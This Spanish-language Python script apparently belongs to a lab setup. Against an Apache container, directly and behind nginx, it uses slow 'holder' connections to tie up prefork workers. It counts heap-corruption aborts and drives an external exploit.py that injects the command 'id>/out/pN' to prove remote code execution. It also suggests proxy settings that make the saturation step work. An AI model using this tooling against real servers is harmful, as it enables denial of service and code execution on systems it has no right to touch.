"""
proxy_pairing_test.py — mide si los holders ocupan workers de Apache a través de un proxy.

Pregunta: cuando las conexiones lentas de hold.py pasan por nginx, ¿llegan a Apache y
bloquean workers, o el proxy las absorbe antes?

Métricas (independientes de la interpretación):

  1. Conexiones TCP ESTABLISHED al puerto 80 dentro del contenedor, leídas de
     /proc/net/tcp y /proc/net/tcp6. Con KeepAlive Off, una conexión establecida con
     cuerpo incompleto mantiene un worker de prefork bloqueado. Es la medida directa
     de ocupación; el número de procesos no sirve, porque prefork mantiene hijos
     ociosos y no crea un proceso por conexión.
  2. Abortos: cuentas de "zend_mm_heap corrupted" y de "exit signal" en los logs del
     contenedor, medidas como delta antes/después del escenario.
  3. Éxitos del exploit, corrida a corrida, con holders readquiridos en cada corrida.

El exploit se lanza contra la URL del escenario (directo o proxy), no contra Apache
cuando el escenario es "via-proxy". El path de `-c` y el de `--proof-file` deben
corresponder al mismo archivo: el comando escribe en /out dentro del contenedor y el
runner lee el path del host que está montado en /out (--proof-dir).

Uso:

    python3 proxy_pairing_test.py \
        --apache http://127.0.0.1:18089/index.php \
        --proxy  http://127.0.0.1:18090/index.php \
        --workers 4 \
        --docker lab-vulnicial \
        --exploit ./9bie/exploit.py \
        --proof-dir ./out \
        --runs 2

Dependencias: docker accesible, hold.py en el mismo directorio, exploit.py opcional.
"""

import argparse
import os
import subprocess
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))
import hold as _hold_mod


# ---------------------------------------------------------------------------
# Introspección del contenedor
# ---------------------------------------------------------------------------

def _docker(container: str, cmd: str) -> str:
    """Ejecuta un comando en el contenedor y devuelve stdout (vacío si falla)."""
    try:
        out = subprocess.run(
            ["docker", "exec", container, "sh", "-c", cmd],
            capture_output=True, text=True, timeout=30,
        )
        return out.stdout
    except Exception:
        return ""


def _established(container: str, port: int = 80) -> int:
    """Cuenta sockets TCP en estado ESTABLISHED cuyo puerto local es `port`."""
    hexport = ":%04X" % port
    total = 0
    for path in ("/proc/net/tcp", "/proc/net/tcp6"):
        data = _docker(container, "cat %s 2>/dev/null" % path)
        for line in data.splitlines()[1:]:
            fields = line.split()
            if len(fields) < 4:
                continue
            local, state = fields[1], fields[3]
            if local.endswith(hexport) and state == "01":
                total += 1
    return total


def _aborts(container: str) -> int:
    """Cuenta corrupciones de heap y muertes de worker en los logs del contenedor."""
    try:
        out = subprocess.run(
            ["docker", "logs", "--tail", "2000", container],
            capture_output=True, text=True, timeout=30,
        )
        combined = out.stdout + out.stderr
    except Exception:
        return 0
    return combined.count("zend_mm_heap corrupted") + combined.count("exit signal")


def _worker_pids(container: str) -> list:
    """PIDs de los procesos apache2 dentro del contenedor (informativo)."""
    data = _docker(container, "pgrep -x apache2 2>/dev/null")
    return [int(x) for x in data.split() if x.isdigit()]


# ---------------------------------------------------------------------------
# Exploit
# ---------------------------------------------------------------------------

def _run_exploit(exploit_path: str, url: str, docker: str,
                 proof_dir: str, run_idx: int, timeout: int = 120):
    """Ejecuta una corrida. Devuelve (éxito, proof).

    El comando se ejecuta dentro del contenedor y escribe en /out/pN; el runner
    lee el mismo archivo desde `proof_dir`, que debe ser el directorio del host
    montado en /out. Si los paths no coinciden, el resultado es un falso negativo.

    El path debe ser corto: exploit.py limita --cmd a 14 bytes ("id>/out/p0" son 10).
    """
    host_proof = os.path.join(proof_dir, "p%d" % run_idx)
    container_proof = "/out/p%d" % run_idx
    try:
        os.unlink(host_proof)
    except FileNotFoundError:
        pass
    except OSError:
        pass

    try:
        res = subprocess.run(
            [sys.executable, exploit_path,
             "-u", url,
             "--docker-container", docker,
             "--proof-file", host_proof,
             "-c", "id>" + container_proof],
            capture_output=True, text=True, timeout=timeout,
        )
        out = (res.stdout or "") + (res.stderr or "")
        ok = "PROOF" in out and os.path.exists(host_proof)
        return ok, out.strip().splitlines()[-1] if out.strip() else ""
    except subprocess.TimeoutExpired:
        return False, "timeout"
    except Exception as exc:
        return False, "error: %r" % (exc,)


# ---------------------------------------------------------------------------
# Escenario
# ---------------------------------------------------------------------------

def run_scenario(label, target_url, n_workers, docker, exploit_path,
                 n_runs, holder_timeout, proof_dir):
    print("\n--- escenario: %s (%s) ---" % (label, target_url))

    base = _established(docker)
    aborts_0 = _aborts(docker)
    print("  conexiones establecidas antes: %d" % base)

    sat = _hold_mod.WorkerSaturator(target_url, n_workers, holder_timeout)
    sat.acquire()
    time.sleep(1.5)
    durante = _established(docker)
    pids = _worker_pids(docker)
    sat.release()
    time.sleep(0.5)
    print("  conexiones establecidas con holders: %d" % durante)
    print("  pids apache2: %s" % pids)
    print("  ocupadas por holders: %d (esperado ~%d)" % (durante - base, n_workers - 1))

    exitos = 0
    detalles = []
    if exploit_path:
        for i in range(n_runs):
            sat = _hold_mod.WorkerSaturator(target_url, n_workers, holder_timeout)
            sat.acquire()
            time.sleep(1.0)
            ok, detalle = _run_exploit(exploit_path, target_url, docker, proof_dir, i)
            sat.release()
            exitos += int(ok)
            detalles.append(detalle)
            print("  run %d/%d: %s | %s" % (i + 1, n_runs, "EXITO" if ok else "fallo", detalle))

    aborts = _aborts(docker) - aborts_0
    print("  abortos (delta): %d" % aborts)

    return {
        "label": label,
        "base": base,
        "durante": durante,
        "ocupadas": max(0, durante - base),
        "pids": pids,
        "abortos": aborts,
        "exitos": exitos,
        "n_runs": n_runs if exploit_path else 0,
    }


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    ap = argparse.ArgumentParser(
        description="Mide si los holders ocupan workers de Apache a través de un proxy.")
    ap.add_argument("--apache", required=True, help="URL directa a Apache (sin proxy)")
    ap.add_argument("--proxy", required=True, help="URL a través del proxy nginx")
    ap.add_argument("--workers", type=int, default=4, help="MaxRequestWorkers de Apache")
    ap.add_argument("--docker", required=True, help="Contenedor con Apache")
    ap.add_argument("--exploit", default="", help="Ruta a exploit.py (opcional)")
    ap.add_argument("--proof-dir", default="/tmp",
                    help="Directorio del host montado en /out del contenedor")
    ap.add_argument("--runs", type=int, default=2, help="Corridas por escenario")
    ap.add_argument("--holder-timeout", type=float, default=120.0,
                    help="Segundos de vida de cada holder")
    args = ap.parse_args()

    if args.exploit and not os.path.exists(args.exploit):
        print("[WARN] no existe %s; se omite el exploit" % args.exploit)
        args.exploit = ""

    resultados = []
    resultados.append(run_scenario(
        "directo", args.apache, args.workers, args.docker, args.exploit,
        args.runs, args.holder_timeout, args.proof_dir))
    resultados.append(run_scenario(
        "via-proxy", args.proxy, args.workers, args.docker, args.exploit,
        args.runs, args.holder_timeout, args.proof_dir))

    print("\n=== RESUMEN ===")
    header = "%-12s %8s %10s %8s %8s" % ("escenario", "base", "con-holders", "abortos", "exitos")
    print(header)
    print("-" * len(header))
    for r in resultados:
        print("%-12s %8d %10d %8d %5d/%-3d" % (
            r["label"], r["base"], r["durante"], r["abortos"], r["exitos"], r["n_runs"]))

    directo, proxy = resultados
    print("\n=== INTERPRETACION ===")
    umbral = args.workers - 1
    if proxy["ocupadas"] >= umbral:
        print("Los holders atraviesan el proxy y ocupan %d/%d workers." % (proxy["ocupadas"], umbral))
        print("El pairing por saturación es viable en este perfil de proxy.")
    elif proxy["ocupadas"] == 0:
        print("Los holders NO llegan a Apache a través del proxy (buffering del cuerpo).")
        print("El pairing por saturación no es viable en este perfil; probar proxy_request_buffering off.")
    else:
        print("Parcial: %d/%d workers ocupados a través del proxy." % (proxy["ocupadas"], umbral))

    if proxy["n_runs"] and directo["exitos"] > 0 and proxy["exitos"] == 0:
        print("El exploit funciona directo y falla a través del proxy: revisar pairing y buffers de cabecera.")


if __name__ == "__main__":
    main()
